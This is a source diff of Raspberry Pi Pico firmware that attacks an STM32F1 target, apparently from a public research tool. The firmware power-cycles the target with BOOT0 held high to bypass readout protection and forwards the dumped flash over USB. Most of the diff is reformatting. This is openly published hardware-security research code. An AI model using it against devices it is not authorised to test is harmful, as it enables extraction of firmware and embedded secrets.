@@ -15,7 +15,7 @@
  * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
  * Pi Pico Attack Board Firmware
- * Version: 1.0
+ * Version: 1.1
 
  * This attack is based on the works of:
  *  Johannes Obermaier, Marc Schink and Kosma Moczek
@@ -43,19 +43,19 @@
 //  Set reset to input
 //  Forward UART to USB
 
-#define LED_PIN     PICO_DEFAULT_LED_PIN
+#define LED_PIN PICO_DEFAULT_LED_PIN
 
 #define UART_TX_PIN 0
 #define UART_RX_PIN 1
-#define POWER_PIN   2
-#define RESET_PIN   4
-#define BOOT0_PIN   5
+#define POWER_PIN 2
+#define RESET_PIN 4
+#define BOOT0_PIN 5
 
-#define UART_BAUD   9600
-#define UART_ID     uart0
-#define DATA_BITS   8
-#define STOP_BITS   1
-#define PARITY      UART_PARITY_NONE
+#define UART_BAUD 9600
+#define UART_ID uart0
+#define DATA_BITS 8
+#define STOP_BITS 1
+#define PARITY UART_PARITY_NONE
 
 #define UART_STALLS_FOR_LED_OFF 10000
 
@@ -82,7 +82,6 @@ int main()
 	gpio_init(RESET_PIN);
 	gpio_init(BOOT0_PIN);
 	gpio_set_dir(LED_PIN, GPIO_OUT);
-	gpio_set_dir(POWER_PIN, GPIO_OUT);
 	gpio_set_dir(BOOT0_PIN, GPIO_OUT);
 	gpio_set_dir(RESET_PIN, GPIO_IN);
 
@@ -95,15 +94,28 @@ int main()
 
 	// -- Attack begins here --
 
-	// Enable power and prepare BOOT0
+	// Set BOOT0 to high and enable power
+
+	/* Boot into SRAM so we can fetch SRAM reset vector address
+	 * See https://github.com/CTXz/stm32f1-picopwner/issues/1#issuecomment-1603281043
+	 */
+	gpio_put(BOOT0_PIN, 1);
+
+	/* Enable power
+	 * Ensure that the power pin set high before configuring it as output
+	 * to prevent the target from sinking current through the pin if the debug
+	 * probe is already attached
+	 */
 	gpio_put(POWER_PIN, 1);
-	gpio_put(BOOT0_PIN, 1); // Will be necessary later, might as well set it now
+	gpio_set_dir(POWER_PIN, GPIO_OUT);
+
 	gpio_put(LED_PIN, 0);
 
 	// -- Ensure that the target exploit firmware has been loaded into the target's SRAM before preceeding --
 
 	// Wait for any serial input to start the attack
-	while (getchar_timeout_us(0) == PICO_ERROR_TIMEOUT) {
+	while (getchar_timeout_us(0) == PICO_ERROR_TIMEOUT)
+	{
 		tight_loop_contents();
 	}
 
@@ -112,7 +124,8 @@ int main()
 	gpio_put(POWER_PIN, 0);
 
 	// Wait for reset to go low
-	while(gpio_get(RESET_PIN)) {
+	while (gpio_get(RESET_PIN))
+	{
 		tight_loop_contents();
 	}
 
@@ -147,26 +160,35 @@ int main()
 	// that we don't forward any garbage data
 	// caused by the reset
 	uint magic_index = 0;
-	while (true) {
+	while (true)
+	{
 		char c = uart_getc(UART_ID);
-		if (c == DUMP_START_MAGIC[magic_index]) {
-			if (++magic_index == sizeof(DUMP_START_MAGIC)) {
+		if (c == DUMP_START_MAGIC[magic_index])
+		{
+			if (++magic_index == sizeof(DUMP_START_MAGIC))
+			{
 				break;
 			}
-		} else {
+		}
+		else
+		{
 			magic_index = 0;
 		}
 	}
 
 	// Forward dumped data from UART to USB serial
 	uint stalls = 0;
-	while (true) {
-		if (uart_is_readable(UART_ID)) {
+	while (true)
+	{
+		if (uart_is_readable(UART_ID))
+		{
 			char c = uart_getc(UART_ID);
 			putchar(c);
 			pwm_set_gpio_level(LED_PIN, c); // LED will change intensity based on UART data
 			stalls = 0;
-		} else {
+		}
+		else
+		{
 			// If no data is received for a while, turn off the LED
 			if (++stalls == UART_STALLS_FOR_LED_OFF)
 				pwm_set_gpio_level(LED_PIN, 0);
